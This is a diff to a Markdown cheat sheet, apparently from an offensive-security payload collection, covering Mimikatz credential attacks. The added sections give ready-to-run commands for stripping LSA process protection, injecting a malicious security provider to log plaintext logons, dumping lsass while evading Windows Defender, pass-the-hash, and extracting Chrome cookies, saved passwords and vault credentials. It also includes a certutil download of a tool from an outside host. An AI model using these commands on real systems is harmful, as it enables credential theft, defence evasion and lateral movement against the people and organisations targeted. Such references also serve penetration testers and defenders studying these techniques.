@@ -2,15 +2,20 @@
 
 ## Summary
 
-* [Mimikatz - Execute commands](#)
-* [Mimikatz - Extract passwords](#)
-* [Mimikatz - Mini Dump](#)
-* [Mimikatz - Golden ticket](#)
-* [Mimikatz - Skeleton key](#)
-* [Mimikatz - RDP session takeover](#)
-* [Mimikatz - Credential Manager & DPAPI](#)
-* [Mimikatz - Commands list](#)
-* [Mimikatz - Powershell version](#)
+* [Mimikatz - Execute commands](#mimikatz---execute-commands)
+* [Mimikatz - Extract passwords](#mimikatz---extract-passwords)
+* [Mimikatz - LSA Protection Workaround](#mimikatz---lsa-protection-workaround)
+* [Mimikatz - Mini Dump](#mimikatz---mini-dump)
+* [Mimikatz - Pass The Hash](#mimikatz---pass-the-hash)
+* [Mimikatz - Golden ticket](#mimikatz---golden-ticket)
+* [Mimikatz - Skeleton key](#mimikatz---skeleton-key)
+* [Mimikatz - RDP session takeover](#mimikatz---rdp-session-takeover)
+* [Mimikatz - Credential Manager & DPAPI](#mimikatz---credential-manager--dpapi)
+  * [Chrome Cookies & Credential](#chrome-cookies--credential)
+  * [Task Scheduled credentials](#task-scheduled-credentials)
+  * [Vault](#vault)
+* [Mimikatz - Commands list](#mimikatz---commands-list)
+* [Mimikatz - Powershell version](#mimikatz---powershell-version)
 * [References](#references)
 
 ![Data in memory](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)
@@ -57,17 +62,69 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   * Adding requires lock
   * Removing requires reboot
 
+## Mimikatz - LSA Protection Workaround
+
+- LSA as a Protected Process
+  ```powershell
+  # Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
+  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
+  # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
+  # Now lets import the mimidriver.sys to the system
+  mimikatz # !+
+
+  # Now lets remove the protection flags from lsass.exe process
+  mimikatz # !processprotect /process:lsass.exe /remove
+
+  # Finally run the logonpasswords function to dump lsass
+  mimikatz # privilege::debug    
+  mimikatz # token::elevate
+  mimikatz # sekurlsa::logonpasswords
+  
+  # Now lets re-add the protection flags to the lsass.exe process
+  mimikatz # !processprotect /process:lsass.exe
+  
+  # Unload the service created
+  mimikatz # !-
+  ```
+
+- LSA is running as virtualized process (LSAISO) by **Credential Guard**
+  ```powershell
+  # Check if a process called lsaiso.exe exists on the running processes
+  tasklist |findstr lsaiso
+
+  # Lets inject our own malicious Security Support Provider into memory
+  # require mimilib.dll in the same folder
+  mimikatz # misc::memssp
+
+  # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
+  ```
+
 
 ## Mimikatz - Mini Dump
 
-Dump the lsass process.
+Dump the lsass process with `procdump`
+
+> Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) "bypasses" that.
 
 ```powershell
-C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# HTTP method - using the default way
+certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
+C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
+# SMB method - using the pid
 net use Z: https://live.sysinternals.com
-Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+tasklist /fi "imagename eq lsass.exe" # Find lsass's pid
+Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
 ```
+
+Dump the lsass process with `rundll32`
+
+```powershell
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
+```
+
+
 
 Then load it inside Mimikatz.
 
@@ -75,6 +132,12 @@ Then load it inside Mimikatz.
 mimikatz # sekurlsa::minidump lsass.dmp
 Switch to minidump
 mimikatz # sekurlsa::logonPasswords
+```
+
+## Mimikatz - Pass The Hash
+
+```powershell
+mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
 ```
 
 ## Mimikatz - Golden ticket
@@ -99,6 +162,8 @@ rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 ```
 
 ## Mimikatz - RDP session takeover
+
+Use `ts::multirdp` to patch the RDP service to allow more than two users.
 
 Run tscon.exe as the SYSTEM user, you can connect to any session without a password.
 
@@ -131,6 +196,38 @@ $ mimikatz !sekurlsa::dpapi
 # use master key
 $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
 ```
+
+### Chrome Cookies & Credential
+
+```powershell
+# Saved Cookies
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
+dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
+
+# Saved Credential in Chrome
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+### Task Scheduled credentials
+
+```powershell
+mimikatz(commandline) # vault::cred /patch
+TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / <NULL>
+UserName   : DOMAIN\user
+Comment    : <NULL>
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Attributes : 0
+```
+
+### Vault
+
+```powershell
+vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
+```
+
 
 ## Mimikatz - Commands list
 
@@ -166,7 +263,7 @@ Mimikatz in memory (no binary on disk) with :
 - [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
 - [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit
 
-More informations can be grabbed from the Memory with :
+More information can be grabbed from the Memory with :
 
 - [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)
 
